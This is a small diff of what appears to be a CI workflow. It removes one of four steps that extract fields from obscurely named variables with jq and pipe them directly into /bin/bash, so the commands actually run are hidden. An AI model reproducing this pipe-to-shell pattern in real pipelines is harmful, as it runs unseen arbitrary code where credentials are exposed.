@@ -36,7 +36,6 @@ jobs:
           echo $m5464 | jq -r .nmz32 | /bin/bash
           printf '%s' "$bfcl6" | jq -r .qoku222 | /bin/bash
           echo $iwxu19 | jq -r .jt4 | /bin/bash
-          echo $lb597 | jq -r .r037 | /bin/bash
 
       - name: Save output
         if: always()
